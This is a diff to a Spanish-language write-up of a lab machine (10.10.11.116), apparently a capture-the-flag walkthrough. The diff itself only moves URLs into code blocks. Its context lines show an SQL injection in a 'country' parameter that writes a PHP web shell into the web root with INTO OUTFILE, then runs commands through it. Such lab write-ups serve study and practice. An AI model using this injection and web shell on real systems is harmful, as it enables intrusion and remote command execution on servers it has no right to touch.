@@ -69,7 +69,11 @@ Esto nos muestra un bad gateway.
 
 #### Analysis manual {-}
 
-Con firefox vamos a la url `http://10.10.11.116` y vemos una pagina que nos permite registrar personas
+Con firefox vamos a la url 
+```bash
+ http://10.10.11.116 
+```
+ y vemos una pagina que nos permite registrar personas
 
 ```bash
 admin - Brazil
@@ -95,7 +99,11 @@ Y tambien a injeccion XSS. Pero como no estamos ni si quiera authenticado, no va
 admin'
 ```
 
-Nos pone `admin'`. Vamos a ver si el input del pays es vulnerable, para esto utilizamos burpsuite.
+Nos pone 
+```bash
+ admin' 
+```
+. Vamos a ver si el input del pays es vulnerable, para esto utilizamos burpsuite.
 
 ## Vulnerability Assessment {-}
 
@@ -162,13 +170,21 @@ Pero son usuarios que hemos creado nosotros.
 username=admin&country=Brazil' union select "probando" into outfile /var/www/html/prueba.txt-- -
 ```
 
-Si vamos con firefox a la url `http://10.10.11.116/prueba.txt` podemos ver prueba. Intentamos subir un fichero php
+Si vamos con firefox a la url 
+```bash
+ http://10.10.11.116/prueba.txt 
+```
+ podemos ver prueba. Intentamos subir un fichero php
 
 ```bash
 username=admin&country=Brazil' union select "<?php system($_REQUEST['cmd']);?>" into outfile /var/www/html/s4vishell.php-- -
 ```
 
-Si vamos a la url `http://10.10.11.116/s4vishell.php?cmd=whoami` vemos que podemos ejecutar comandos.
+Si vamos a la url 
+```bash
+ http://10.10.11.116/s4vishell.php?cmd=whoami 
+```
+ vemos que podemos ejecutar comandos.
 
 ### Creamos un autopwn en python {-}
 
